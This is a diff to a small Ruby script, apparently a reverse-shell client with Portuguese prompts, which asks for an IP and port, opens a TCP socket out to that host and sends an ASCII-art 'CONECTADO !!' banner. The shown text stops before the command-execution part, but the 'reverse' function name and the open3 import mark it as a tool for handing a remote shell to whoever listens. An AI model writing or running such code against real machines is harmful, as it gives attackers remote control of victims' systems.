@@ -3,19 +3,33 @@ require 'socket'
 require 'open3'
 
 
-def reverse
-  print "Coloque seu ip: "
-  @lhost=gets.chomp
-  print "Coloque a porta: "
-  @port=gets.chomp
+
+
+def reverse(lhost,port)
+  @lhost=lhost
+  @port=port
 end
 
-reverse
+print "Coloque seu ip: "
+lhost=gets.chomp
+print "Passe a porta: "
+port=gets.chomp
+reverse(lhost,port)
 
-def connect
-  @socket=TCPSocket.new "#{@lhost}", "#{@port}"
-  @socket.puts "Conectado !!"
-end
+  def connect
+    @socket=TCPSocket.new "#{@lhost}", "#{@port}"
+    @dec="-" * 100
+    @socket.puts "#{@dec}\n
+    _  ____________.---------.
+    \`'  __________|_________| ========0 CONECTADO !!
+    /   (_)__]
+   |    |
+  .'   .'
+  |____]
+    
+    \n#{@dec}"
+
+  end
 
 def try
     begin
